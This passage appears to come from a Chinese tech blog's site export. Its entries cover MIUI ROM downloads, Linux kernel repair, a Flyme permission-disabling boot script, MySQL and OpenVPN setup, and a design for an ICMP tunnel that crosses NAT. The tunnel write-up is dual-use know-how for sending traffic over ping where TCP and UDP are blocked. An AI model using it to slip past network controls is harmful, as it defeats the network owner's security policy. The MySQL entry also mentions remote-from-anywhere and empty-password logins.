      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>下载旧版本的miui卡刷包</title>
    <url>/2017/06/02/download-old-miui-rom/</url>
    <content><![CDATA[<p><a href="http://www.miui.com/download.html" target="_blank" rel="noopener">miui网站</a>提供了所有小米手机的卡刷包下载链接，但是默认只有最新的3个版本。如果我要下载旧点的版本（比如现在是miui8，但是我想下miui7），一般会在论坛里搜索，但如果论坛里也搜索不到怎么办呢？<br>这个时候我们会借助于历史页面网站，因为虽然页面更新了，但是旧版本的下载链接还是有效的。</p>
<p>1、 打开网站: <a href="http://web.archive.org/" target="_blank" rel="noopener">http://web.archive.org/</a></p>
<p>2、 在搜索框中输入要查看的页面url，比如红米Note的miui下载页面：<a href="http://www.miui.com/download-218.html" target="_blank" rel="noopener">http://www.miui.com/download-218.html</a>。然后，页面会显示所有收录的历史记录。</p>
<p><img src="/images/web.archive.org.png" alt></p>
<p>3、 选择某一天的版本进去，发现有7.0的rom了</p>
<p><img src="/images/miui7.png" alt></p>
<p>4、点击下载，由于此时的链接地址是被web.archive.org处理过的：</p>
<blockquote>
<p><a href="http://web.archive.org/web/20161118214831/http://bigota.d.miui.com/V7.5.1.0.KHECNDE/miui_HMNoteTD_V7.5.1.0.KHECNDE_b9b75c8daf_4.4.zip" target="_blank" rel="noopener">http://web.archive.org/web/20161118214831/http://bigota.d.miui.com/V7.5.1.0.KHECNDE/miui_HMNoteTD_V7.5.1.0.KHECNDE_b9b75c8daf_4.4.zip</a></p>
</blockquote>
<p>如果不能直接下载，只要去掉前面的<code>http://web.archive.org/web/20161118214831/</code>即可。</p>
]]></content>
      <tags>
        <tag>miui</tag>
        <tag>rom</tag>
      </tags>
  </entry>
  <entry>
    <title>修复Linux内核文件丢失问题</title>
    <url>/2018/02/11/fix-linux-kernel/</url>
    <content><![CDATA[<p>如果误操作了<code>/boot</code>目录下kernel文件，会导致无法进入系统，此时，必须要借助第三方系统来进行kernel的修复。</p>
<p><img src="/images/linux-no-kernel.png" alt></p>
<p>以下以 Ubuntu 16.04系统为例，介绍修复的方法。以下操作都需要root权限。</p>
<p>1、 使用<code>Universal USB Installer</code>制作Ubuntu的USB启动盘，重启进入<code>Live</code>模式</p>
<p>2、 使用<code>mount</code>命令查看系统分区挂载的路径</p>
<p><img src="/images/sda1_mount.png" alt></p>
<p>3、 进入挂载目录</p>
<pre><code class="bash">cd /media/ubuntu/c7b8708f-1e7a-4fd0-9815-97be053dad67
</code></pre>
<p>4、 绑定<code>dev</code>、<code>proc</code>、<code>sys</code>等目录</p>
<pre><code class="bash">mount --bind /dev dev
mount --bind /proc proc
mount --bind /sys sys
</code></pre>
<p>5、 使用<code>chroot</code>将当前目录变为根目录（这样，之后的操作，都是针对待修复系统的分区）</p>
<pre><code class="bash">chroot .
</code></pre>
<p><img src="/images/chroot-cmdline.png" alt></p>
<p>6、修复kernel</p>
<pre><code class="bash">apt update
apt install linux-image-generic
</code></pre>
<p><img src="/images/install_kernel.png" alt></p>
<p>可以看到，新的kernel已经被安装到boot目录中了。</p>
<p>此时，重启系统可以正常进去了。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>手机刷入第三方recovery教程汇总</title>
    <url>/2017/01/07/flash-recovery/</url>
    <content><![CDATA[<ul>
<li><a href="http://bbs.xiaomi.cn/thread-8844774-1-1.html" target="_blank" rel="noopener">小米2/2S</a></li>
<li><a href="http://www.netded.com/a/jingpinshouji/2014/0807/28945.html" target="_blank" rel="noopener">小米4</a></li>
<li><a href="http://www.60ke.cn/html/sjsy/shuaj/2014/1115/15479.html" target="_blank" rel="noopener">华为Mate7</a></li>
<li><a href="http://www.miui.com/thread-2229950-1-1.html" target="_blank" rel="noopener">红米2</a></li>
<li><a href="http://www.muzisoft.com/root/59516.html" target="_blank" rel="noopener">三星i9500</a></li>
<li><a href="http://bbs.ydss.cn/thread-496737-1-1.html" target="_blank" rel="noopener">红牛v5S</a></li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>recovery</tag>
      </tags>
  </entry>
  <entry>
    <title>flyme中关闭系统的权限管理</title>
    <url>/2017/01/07/flyme-close-perm/</url>
    <content><![CDATA[<p>flyme中通过“安全中心”应用管理应用权限，未找到关闭权限管理的入口。后来发现是一个隐藏的Activity中可以关闭。</p>
<blockquote>
<p>am start -n com.meizu.safe/.security.SecSettingsActivity</p>
</blockquote>
<p>这个命令可以打开设置界面进行关闭。</p>
<p>不过重启之后，系统还会自动开启权限管理，目前能找到的解决方法是在手机启动的时候用脚本关闭。</p>
<pre><code>sleep 30  
am start -n    com.meizu.safe/.security.SecSettingsActivity &amp;&amp; sleep 1  
input keyevent 66 &amp;&amp; sleep 1  
input keyevent 66 &amp;&amp; sleep 1  
input keyevent 61 &amp;&amp; sleep 1  
input keyevent 66
</code></pre><p>将如上代码添加到<strong>/system/etc/install-recovery.sh</strong>脚本后面，这样手机启动后就会自动执行了。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>flyme</tag>
      </tags>
  </entry>
  <entry>
    <title>如何实现支持NAT的ICMP隧道</title>
    <url>/2022/05/05/icmp-tunnel-through-nat/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近遇到一个客户环境比较特殊，无法使用TCP或UDP访问外网，但是可以ping通外网。于是想到通过ICMP协议建立与外界的通信链路。在尝试了几个开源工具都宣告失败后，准备自己撸一个ICMP隧道。当然，这个隧道工具需要支持穿过NAT访问网络。</p>
<h2 id="0x01-NAT对ICMP的限制"><a href="#0x01-NAT对ICMP的限制" class="headerlink" title="0x01 NAT对ICMP的限制"></a>0x01 NAT对ICMP的限制</h2><p>通常来说，NAT对TCP和UDP支持都比较好，但对ICMP一般限制会比较多。例如，常见的限制条件有：</p>
<ul>
<li>内部机器只能发送PING包；外部机器只能返回PONG包，而且ICMP的<code>id</code>和<code>seq</code>字段必须与PING包保持一致</li>
<li>每个PING包只能有一个对应的PONG包，映射关系维持时间较短，最多在几十秒的量级，超时之后即便接收到了PONG包也不会转发给内部机器</li>
</ul>
<p>在部分对安全性要求更高的场景下，还会有以下一些限制：</p>
<ul>
<li>PING包与PONG包长度必须一致</li>
<li>更短的超时时间（秒级）</li>
</ul>
<p>因此，ICMP隧道没法实现完美的双向通信，需要使用类似不断<code>PULL</code>的逻辑去保证数据返回通道的畅通。</p>
<h2 id="0x02-实现ICMP隧道的一些关键点"><a href="#0x02-实现ICMP隧道的一些关键点" class="headerlink" title="0x02 实现ICMP隧道的一些关键点"></a>0x02 实现ICMP隧道的一些关键点</h2><h3 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h3><p>ICMP协议与UDP协议类似，是不保证可靠传输的，需要上层逻辑进行<code>连接</code>的管理。这里连接管理的主要目的有：</p>
<ul>
<li>数据包重组，保证接收顺序与发送顺序一致</li>
<li>数据包确认，丢包重传，保证可靠传输</li>
<li>保活检测，及时发现连接中断</li>
</ul>
<p>因此，可以看出，需要设计一套类似于TCP的协议与算法，考虑到ICMP无法全双工的问题，这个算法应当尽量的简单、高效。</p>
<h3 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h3><p>根据上面的分析，ICMP协议在通信过程中含有较多非数据面的通信，而ICMP隧道中一般会包含多条数据流，因此最好能够支持多路复用，从而提升通信效率和降低报错的风险。</p>
<p>这里的多路复用可以考虑在更高的层面支持。</p>
<h3 id="保活机制"><a href="#保活机制" class="headerlink" title="保活机制"></a>保活机制</h3><p>常见的保活机制一般是双向发送PING包，然后在超时时间内看对端能否返回PONG包。由于ICMP隧道不支持全双工，只能由客户端发送PING包，服务端返回PONG包（上层定义的PING/PONG，非ICMP层的PING/PONG）。</p>
<p>同时，由于NAT会检查ICMP PING和PONG的id与seq字段的一致性，这里保活时发送的PING包还可以起到<code>穿透NAT</code>的作用。只要客户端发送了足够多的PING包，服务端在返回数据时就有足够多的(<code>id</code>, <code>seq</code>)可用。否则，可能会出现服务端要发送数据给客户端时，却因为没有(<code>id</code>, <code>seq</code>)导致不能及时将数据返回回来，从而导致不必要的时延。</p>
<h3 id="延时确认"><a href="#延时确认" class="headerlink" title="延时确认"></a>延时确认</h3><p>如果接收到数据包就立即通过<code>PING</code>包或<code>PONG</code>包进行ACK确认，会导致后面在需要发送数据时还会产生<code>WRITE</code>包。如果这两个包时间非常接近，则前面发送的包其实是没有必要的。可以通过延时确认机制，保证在这种情况下不会产生多余的数据包。其实现原理基本与TCP的延时确认机制是一致的。</p>
<h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>在网络较差的环境中，过快地发送数据包可能会导致无法及时对数据包进行确认，从而达到超时时间进行重传，又可能进一步降低了网络的可用性。因此，需要需要控制处于发送中状态的数据包数量。对于网络较好的情况，可以提升这个值，网络不好的情况就需要降低这个值。</p>
<p>由于PING包会影响接收数据的效率，因此也需要控制发送PING包的速度，保证服务端有足够的(<code>id</code>, <code>seq</code>)可用，却又不会产生超过网络承受能力的流量。</p>
<h2 id="0x03-协议设计"><a href="#0x03-协议设计" class="headerlink" title="0x03 协议设计"></a>0x03 协议设计</h2><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层协议主要是为了解决<code>连接管理</code>相关的问题，需要保证连接的可靠性。为了减少传输层占用的空间，考虑使用二进制协议，使用网络字节序，基本设计如下：</p>
<pre><code>|             Magic Flag            |
| --------------- 4 --------------- |
|   Total length  |    Checksum     |
| ------ 2 ------ | ------ 2 ------ |
|       Seq       |       Ack       |
| ------ 2 ------ | ------ 2 ------ |
| ------------- Event ------------- |
| --------------- 4 --------------- |
| - Client Port - | - Server Port - |
| ------ 2 ------ | ------ 2 ------ |
|              Padding              |
</code></pre><ul>
<li>开头是一个4字节的固定<code>魔术标记</code>，用于协议识别</li>
<li>2字节的数据包总大小和2字节的校验码（校验算法与TCP/IP一致）</li>
<li>2字节的包序号和2字节的确认包序号</li>
<li>4字节的事件ID</li>
<li>2字节的客户端端口号和2字节的服务端端口号</li>
<li>最后面是填充数据</li>
</ul>
<p>与TCP使用字节数作为序号和确认号不同，这里是以包为单位，因为传输是以包为单位的，无法再进行拆分。</p>
<p>包总大小使用2字节，是因为单个IP数据包受<code>MTU</code>影响，一般最大大小是<code>1500</code>，不会出现大于<code>63335</code>的情况。为了保证请求包和返回包的大小相等，组包时会按照设置的最大包大小进行<code>补0</code>操作，解包时会按照包大小字段去掉后面填充的\x00字节。</p>
<p>事件ID主要起管理连接的作用，主要有：<code>CONNECT</code>、<code>OKAY</code>、<code>FAIL</code>、<code>WRITE</code>、<code>CLOSE</code>、<code>PING</code>、<code>PONG</code>等类型事件，内部会有状态机对连接进行管理。除了<code>PING</code>和<code>PONG</code>序号字段为0，其它包都是从1开始递增的；也就是说，只有这两种包不需要确认。</p>
<p>客户端端口号和服务端端口号主要是为了支持多路复用，因为ICMP没有端口的概念，可以使用这两个字段来代替端口。</p>
<p>主要流程如下：</p>
<ol>
<li>服务端指定监听端口号开始监听接收到的ICMP包；对于接收到的ICMP包，检查是否以<code>Magic Flag</code>开头，如果不是则直接忽略；并进行其它字段的有效性检查，包括服务端端口号是否与监听的端口号一致</li>
<li>客户端生成随机2字节整型数字作为本地端口号，指定服务端端口号，<code>Seq</code>字段设为0，组成<code>CONNECT</code>包发送到服务端</li>
<li>服务端接收到<code>CONNECT</code>包后，判断客户端端口是否已经建立连接，如果没有则返回<code>OKAY</code>包，并创建对应的数据结构；否则返回<code>FAIL</code>包</li>
<li>客户端后接收到<code>OKAY</code>包后，连接建立;并开始定时发送<code>PING</code>包，间隔时间最大为5秒，如果接收到服务端发送过来的<code>WRITE</code>包或<code>PONG</code>包，也会立即发送<code>PING</code>包</li>
<li>客户端和服务端在需要发送上层数据时都会组成<code>WRITE</code>包发送过去，如果上层发送的数据量较大，则需要进行分包后发送，保证最终的每个IP包的大小&lt;=1500字节</li>
<li>在收到对方发送过来的数据包时，最多会延时100ms进行确认；如果这段时间内有数据要发送，则ACK会跟随待发送数据一起发送出去，否则会使用<code>PING</code>包或<code>PONG</code>进行ACK确认</li>
<li>当服务端有大量数据需要发送时，会由于缺少足够的(<code>id</code>、<code>seq</code>)，导致无法及时将数据返回回来。为了提升这种情况的发送效率，收到服务端数据时，会立即进行ACK确认（根据数据包大小是否达到最大来判断）；同时，需要根据接收数据的频率控制发送<code>PING</code>包的频率，保证服务端有足够多的(<code>id</code>、<code>seq</code>)可用</li>
<li>为保证服务端有数据要发送时能及时返回回来，需要保证服务端在任意时刻都至少有一个未超时的(<code>id</code>、<code>seq</code>)；因此，即便是在双方都没有数据需要发送的时候，客户端也会保证每隔5秒发送一次<code>PING</code>包，服务端则会在收到<code>PING</code>包后等待最多5秒返回<code>PONG</code>包</li>
<li>如果客户端连续30秒都没有收到对方发送过来的数据包，则认为连接已断开；服务端也是类似的逻辑</li>
</ol>
<p>可以看出，这里基本实现了类似TCP的逻辑，只是实现上简化了很多；并针对ICMP穿越NAT的特点做了适配。</p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层协议的目标是为了多条数据流可以复用同一个传输层连接，在设计上更多考虑可扩展性。因此，选用<code>msgpack</code>格式作为序列化格式。这种格式使用上与json类似，但又是二进制格式的，还支持buffer类型，因此非常适合作为序列化格式。</p>
<p>为了在处理数据时能正常进行分包，需要在数据包前面加上4字节的序列化后的<code>msgpack</code>字节序大小。由于传输层会自动进行分包逻辑，因此上层可以不用关心这一实现细节，允许发送任意长度的数据包。</p>
<p>应用层主要是创建隧道并写数据，以及关闭隧道等操作。因此，主要也是包含这三种类型的操作。</p>
<ol>
<li>首先使用<code>create</code>类型的事件创建一条流，并指定要连接的目标地址，服务端连接成功则返回一个随机生成的4字节整型流ID，否则返回-1</li>
<li>流创建成功后，双方在需要写数据时会使用<code>write</code>类型的事件，指定流ID写数据；服务端将收到的客户端数据转发给目标服务，而客户端是将服务端返回的数据转发给隧道创建者</li>
<li>隧道创建者或目标服务关闭时都会触发关闭隧道的操作，该操作会通过<code>close</code>事件指定流ID发送给对端，从而关闭流并删除流ID</li>
</ol>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>详细实现代码可以看：<a href="https://github.com/drunkdream/turbo-tunnel/blob/master/turbo_tunnel/icmp.py" target="_blank" rel="noopener">https://github.com/drunkdream/turbo-tunnel/blob/master/turbo_tunnel/icmp.py</a>。目前的实现基本可用，但在传输大量数据的场景还需要再进行进一步的优化。</p>
<p>通过将协议分为传输层和应用层，降低了复杂性，并提升了代码的可读性和可维护性。在这个过程中，也加深了对TCP可靠连接的理解。</p>
]]></content>
      <categories>
        <category>Protocol</category>
      </categories>
      <tags>
        <tag>nat</tag>
        <tag>icmp</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04 部署MySQL服务</title>
    <url>/2018/07/11/install-mysql-server/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>MySQL是一款开源的关系型数据库管理系统，大量公司都在使用它，或是在它的基础上做二次开发。有时，我们会需要在Linux系统上部署MySQL服务用于测试。</p>
<p>本文是根据网上的经验分享以及亲自实践的过程总结而来。实验环境为：Ubuntu 16.04 x64。</p>
<h2 id="0x01-安装MySQL服务端和客户端"><a href="#0x01-安装MySQL服务端和客户端" class="headerlink" title="0x01 安装MySQL服务端和客户端"></a>0x01 安装MySQL服务端和客户端</h2><pre><code>apt install mysql-server -y 
apt install mysql-client -y
</code></pre><p>安装<code>mysql-server</code>过程中会提示输入<code>root</code>用户密码。</p>
<p>查看mysql版本:</p>
<pre><code class="bash">$ mysqld --version
mysqld  Ver 5.7.22-0ubuntu0.16.04.1 for Linux on x86_64 ((Ubuntu))
</code></pre>
<p>使用<code>netstat -an | grep 3306</code>命令测试服务是否安装成功:</p>
<pre><code>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN 
</code></pre><h2 id="0x02-修改配置文件"><a href="#0x02-修改配置文件" class="headerlink" title="0x02 修改配置文件"></a>0x02 修改配置文件</h2><p>mysql默认监听的是回环地址，如果要改为监听全局地址，可以修改mysql的配置文件：<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>，默认配置如下：</p>
<pre><code>[mysqld]
#
# * Basic Settings
#
user            = mysql
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
port            = 3306
basedir         = /usr
datadir         = /var/lib/mysql
tmpdir          = /tmp
lc-messages-dir = /usr/share/mysql
skip-external-locking
#
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
bind-address            = 127.0.0.1
</code></pre><p>注释掉以下行就可以监听全局地址：</p>
<pre><code>#bind-address            = 127.0.0.1
</code></pre><p>以下行可以修改监听端口：</p>
<pre><code>port            = 13306
</code></pre><p>修改默认编码为：<code>utf8</code>，在<code>[mysqld]</code>下新增以下行：</p>
<pre><code>collation-server = utf8_unicode_ci
init-connect=&#39;SET NAMES utf8&#39;
character-set-server = utf8
</code></pre><p>重启mysql服务：<code>systemctl restart mysql</code>，确认配置生效</p>
<p>确认编码是否生效的方法是通过<code>mysql -u root -p</code>进入mysql命令行后，使用<code>SHOW VARIABLES LIKE &quot;character_set_server&quot;;</code>确认。</p>
<pre><code>mysql&gt; SHOW VARIABLES LIKE &quot;character_set_server&quot;;
+----------------------+-------+
| Variable_name        | Value |
+----------------------+-------+
| character_set_server | utf8  |
+----------------------+-------+
1 row in set (0.01 sec)
</code></pre><h2 id="0x03-创建用户和数据库"><a href="#0x03-创建用户和数据库" class="headerlink" title="0x03 创建用户和数据库"></a>0x03 创建用户和数据库</h2><p>为了安全性，一般不使用<code>root</code>帐号登录，可以创建子用户登录。</p>
<p>使用<code>mysql -u root -p</code>命令进入mysql命令行，输入以下命令创建用户。</p>
<pre><code>CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;
</code></pre><p><code>username</code>：新创建的用户名<br><code>host</code>：指定该用户在哪个主机上可以登陆，如果是本地用户可用localhost，如果想让该用户可以从任意远程主机登陆，可以使用通配符<code>%</code><br><code>password</code>：该用户的登录密码，密码可以为空，如果为空则该用户可以不需要密码登录服务器</p>
<p>此时，该用户还没有对应的数据库，可以使用以下命令创建：</p>
<pre><code>CREATE DATABASE database character set utf8;
</code></pre><p>然后授予用户访问权限：</p>
<pre><code>GRANT privileges ON database.table TO &#39;username&#39;@&#39;host&#39;
</code></pre><p><code>privileges</code>：用户的操作权限，如<code>SELECT</code>，<code>INSERT</code>，<code>UPDATE</code>等，如果要授予所的权限则使用<code>ALL</code><br><code>database</code>：数据库名<br><code>table</code>：表名，如果要授予该用户对所有数据库和表的相应操作权限则可用<code>*</code>表示，如: <code>*.*</code></p>
<h2 id="0x04-常用操作"><a href="#0x04-常用操作" class="headerlink" title="0x04 常用操作"></a>0x04 常用操作</h2><ul>
<li>查看当前已创建的数据库列表<ul>
<li><code>SHOW DATABASES;</code></li>
</ul>
</li>
<li>查看用户列表<ul>
<li><code>SELECT USER FROM mysql.user</code></li>
</ul>
</li>
<li>修改用户密码<ul>
<li><code>SET PASSWORD for &#39;username&#39;@&#39;host&#39; = password(&#39;password&#39;);</code></li>
</ul>
</li>
<li>导出<code>.sql</code>文件<ul>
<li><code>mysqldump -h server -P port -u username -p database &gt; backup.sql</code></li>
</ul>
</li>
<li>导入<code>.sql</code>文件<ul>
<li><code>mysql -u username -p database &lt; backup.sql</code></li>
</ul>
</li>
<li>获取慢查询列表<ul>
<li><code>SELECT concat(&#39;kill &#39;, id, &#39;;&#39;) FROM information_schema.processlist WHERE Command != &#39;Sleep&#39; AND Time &gt; 300 ORDER BY Time DESC;</code></li>
</ul>
</li>
</ul>
<h2 id="0x05-客户端访问"><a href="#0x05-客户端访问" class="headerlink" title="0x05 客户端访问"></a>0x05 客户端访问</h2><p>在服务器上一般使用<code>mysql</code>命令访问，在本地电脑上我一般使用<code>MySQL-Front</code>软件访问，全部可视化操作，非常方便。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu部署OpenVPN服务</title>
    <url>/2017/12/16/install-openvpn-server/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>OpenVPN是一款跨平台的开源VPN软件，它利用虚拟网卡，以一种全新的方式实现了SSL VPN的功能，能够适应IP层之上的几乎所有应用。它使用TCP或UDP协议进行通信，相比于其它VPN，具有更好的NAT兼容性。</p>
<p>以下以腾讯云的Ubuntu 16.04.1 TLS 64位系统作为部署环境。<br>如无特别说明，以下所执行的命令都需要root权限。</p>
<h2 id="0x01-创建证书"><a href="#0x01-创建证书" class="headerlink" title="0x01 创建证书"></a>0x01 创建证书</h2><p>如果已经有证书，可以忽略本步操作。</p>
<h3 id="安装easy-rsa"><a href="#安装easy-rsa" class="headerlink" title="安装easy-rsa"></a>安装easy-rsa</h3><blockquote>
<p>apt-get -y install easy-rsa</p>
</blockquote>
<h3 id="修改证书配置"><a href="#修改证书配置" class="headerlink" title="修改证书配置"></a>修改证书配置</h3><blockquote>
<p>cd /usr/share/easy-rsa</p>
</blockquote>
<blockquote>
<p>vi vars</p>
</blockquote>
<p>修改以下变量的默认配置：</p>
<pre><code>export KEY_COUNTRY=&quot;US&quot;
export KEY_PROVINCE=&quot;CA&quot;
export KEY_CITY=&quot;SanFrancisco&quot;
export KEY_ORG=&quot;Fort-Funston&quot;
export KEY_EMAIL=&quot;me@myhost.mydomain&quot;
export KEY_OU=&quot;MyOrganizationalUnit&quot;
</code></pre><p>如：</p>
<pre><code>export KEY_COUNTRY=&quot;CN&quot;
export KEY_PROVINCE=&quot;GD&quot;
export KEY_CITY=&quot;Shenzhen&quot;
export KEY_ORG=&quot;drunkdream&quot;
export KEY_EMAIL=&quot;admin@drunkdream.com&quot;
export KEY_OU=&quot;drunkdream&quot;
</code></pre><p>将<code># export KEY_CN=&quot;CommonName&quot;</code>改为：<code>export KEY_CN=&quot;server&quot;</code></p>
<blockquote>
<p>source ./vars</p>
<p>./clean-all</p>
</blockquote>
<h3 id="生成根证书"><a href="#生成根证书" class="headerlink" title="生成根证书"></a>生成根证书</h3><blockquote>
<p>./build-ca</p>
</blockquote>
<p>如果出现以下错误：</p>
<blockquote>
<p>140695501473432:error:0E065068:configuration file routines:STR_COPY:variable has no value:conf_def.c:584:line 198</p>
</blockquote>
<blockquote>
<p>139878249313944:error:0E065068:configuration file routines:STR_COPY:variable has no value:conf_def.c:584:line 220</p>
</blockquote>
<p>请注释掉198行和220行的内容：</p>
<blockquote>
<p>subjectAltName=$ENV::KEY_ALTNAMES</p>
</blockquote>
<p>一路回车，完成后，会在keys目录下生成ca.crt和ca.key。</p>
<h3 id="生成服务器证书和密钥"><a href="#生成服务器证书和密钥" class="headerlink" title="生成服务器证书和密钥"></a>生成服务器证书和密钥</h3><blockquote>
<p>./build-key-server server</p>
</blockquote>
<p>遇到<code>Sign the certificate? [y/n]</code>以及<code>1 out of 1 certificate requests certified, commit? [y/n]</code></p>
<p>请输入<code>y</code>，并回车；其它情况直接回车即可。</p>
<p>完成后，会在keys目录下生成server.crt、server.csr、server.key三个文件。</p>
<h3 id="生成Diffie-Hellman密钥"><a href="#生成Diffie-Hellman密钥" class="headerlink" title="生成Diffie-Hellman密钥"></a>生成Diffie-Hellman密钥</h3><blockquote>
<p>./build-dh</p>
</blockquote>
<p>该步操作耗时较长，请耐心等待。</p>
<p>完成后，会在keys目录下生成dh2048.pem文件。</p>
<h3 id="生成客户端证书和密钥"><a href="#生成客户端证书和密钥" class="headerlink" title="生成客户端证书和密钥"></a>生成客户端证书和密钥</h3><blockquote>
<p>./build-key client</p>
</blockquote>
<p>与前面的步骤相同，在<code>Sign the certificate</code>和<code>1 out of 1 certificate requests certified, commit?</code>两处输入<code>y</code>并回车，其它地方直接回车即可。</p>
<p>完成后，会在keys目录下生成client.crt、client.csr、client.key三个文件。</p>
<h2 id="0x02-安装OpenVPN并修改配置"><a href="#0x02-安装OpenVPN并修改配置" class="headerlink" title="0x02 安装OpenVPN并修改配置"></a>0x02 安装OpenVPN并修改配置</h2><blockquote>
<p>apt-get -y install openvpn</p>
</blockquote>
<p>OpenVPN的配置文件目录为：/etc/openvpn。</p>
<p>将之前生成的ca.crt、server.crt、server.key、dh2048.pem这四个文件拷贝到/etc/openvpn目录。</p>
<p>创建/etc/openvpn/server.conf文件，内容如下：</p>
<pre><code>#################################################
# Sample OpenVPN 2.0 config file for            #
# multi-client server.                          #
#                                               #
# This file is for the server side              #
# of a many-clients &lt;-&gt; one-server              #
# OpenVPN configuration.                        #
#                                               #
# OpenVPN also supports                         #
# single-machine &lt;-&gt; single-machine             #
# configurations (See the Examples page         #
# on the web site for more info).               #
#                                               #
# This config should work on Windows            #
# or Linux/BSD systems.  Remember on            #
# Windows to quote pathnames and use            #
# double backslashes, e.g.:                     #
# &quot;C:\\Program Files\\OpenVPN\\config\\foo.key&quot; #
#                                               #
# Comments are preceded with &#39;#&#39; or &#39;;&#39;         #
#################################################

# Which local IP address should OpenVPN
# listen on? (optional)
;local a.b.c.d

# Which TCP/UDP port should OpenVPN listen on?
# If you want to run multiple OpenVPN instances
# on the same machine, use a different port
# number for each one.  You will need to
# open up this port on your firewall.
port 1194

# TCP or UDP server?
;proto tcp
proto udp

# &quot;dev tun&quot; will create a routed IP tunnel,
# &quot;dev tap&quot; will create an ethernet tunnel.
# Use &quot;dev tap0&quot; if you are ethernet bridging
# and have precreated a tap0 virtual interface
# and bridged it with your ethernet interface.
# If you want to control access policies
# over the VPN, you must create firewall
# rules for the the TUN/TAP interface.
# On non-Windows systems, you can give
# an explicit unit number, such as tun0.
# On Windows, use &quot;dev-node&quot; for this.
# On most systems, the VPN will not function
# unless you partially or fully disable
# the firewall for the TUN/TAP interface.
;dev tap
dev tun

# Windows needs the TAP-Win32 adapter name
# from the Network Connections panel if you
# have more than one.  On XP SP2 or higher,
# you may need to selectively disable the
# Windows firewall for the TAP adapter.
# Non-Windows systems usually don&#39;t need this.
;dev-node MyTap

# SSL/TLS root certificate (ca), certificate
# (cert), and private key (key).  Each client
# and the server must have their own cert and
# key file.  The server and all clients will
# use the same ca file.
#
# See the &quot;easy-rsa&quot; directory for a series
# of scripts for generating RSA certificates
# and private keys.  Remember to use
# a unique Common Name for the server
# and each of the client certificates.
#
# Any X509 key management system can be used.
# OpenVPN can also use a PKCS #12 formatted key file
# (see &quot;pkcs12&quot; directive in man page).
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key  # This file should be kept secret

# Diffie hellman parameters.
# Generate your own with:
#   openssl dhparam -out dh2048.pem 2048
dh /etc/openvpn/dh2048.pem

# Network topology
# Should be subnet (addressing via IP)
# unless Windows clients v2.0.9 and lower have to
# be supported (then net30, i.e. a /30 per client)
# Defaults to net30 (not recommended)
;topology subnet

# Configure server mode and supply a VPN subnet
# for OpenVPN to draw client addresses from.
# The server will take 10.8.0.1 for itself,
# the rest will be made available to clients.
# Each client will be able to reach the server
# on 10.8.0.1. Comment this line out if you are
# ethernet bridging. See the man page for more info.
server 192.168.1.0 255.255.255.0

# Maintain a record of client &lt;-&gt; virtual IP address
# associations in this file.  If OpenVPN goes down or
# is restarted, reconnecting clients can be assigned
# the same virtual IP address from the pool that was
# previously assigned.
ifconfig-pool-persist ipp.txt

# Configure server mode for ethernet bridging.
# You must first use your OS&#39;s bridging capability
# to bridge the TAP interface with the ethernet
# NIC interface.  Then you must manually set the
# IP/netmask on the bridge interface, here we
# assume 10.8.0.4/255.255.255.0.  Finally we
# must set aside an IP range in this subnet
# (start=10.8.0.50 end=10.8.0.100) to allocate
# to connecting clients.  Leave this line commented
# out unless you are ethernet bridging.
;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100

# Configure server mode for ethernet bridging
# using a DHCP-proxy, where clients talk
# to the OpenVPN server-side DHCP server
# to receive their IP address allocation
# and DNS server addresses.  You must first use
# your OS&#39;s bridging capability to bridge the TAP
# interface with the ethernet NIC interface.
# Note: this mode only works on clients (such as
# Windows), where the client-side TAP adapter is
# bound to a DHCP client.
;server-bridge

# Push routes to the client to allow it
# to reach other private subnets behind
# the server.  Remember that these
# private subnets will also need
# to know to route the OpenVPN client
# address pool (10.8.0.0/255.255.255.0)
# back to the OpenVPN server.
;push &quot;route 192.168.10.0 255.255.255.0&quot;
;push &quot;route 192.168.20.0 255.255.255.0&quot;

# To assign specific IP addresses to specific
# clients or if a connecting client has a private
# subnet behind it that should also have VPN access,
# use the subdirectory &quot;ccd&quot; for client-specific
# configuration files (see man page for more info).

# EXAMPLE: Suppose the client
# having the certificate common name &quot;Thelonious&quot;
# also has a small subnet behind his connecting
# machine, such as 192.168.40.128/255.255.255.248.
# First, uncomment out these lines:
;client-config-dir ccd
;route 192.168.40.128 255.255.255.248
# Then create a file ccd/Thelonious with this line:
#   iroute 192.168.40.128 255.255.255.248
# This will allow Thelonious&#39; private subnet to
# access the VPN.  This example will only work
# if you are routing, not bridging, i.e. you are
# using &quot;dev tun&quot; and &quot;server&quot; directives.

# EXAMPLE: Suppose you want to give
# Thelonious a fixed VPN IP address of 10.9.0.1.
# First uncomment out these lines:
;client-config-dir ccd
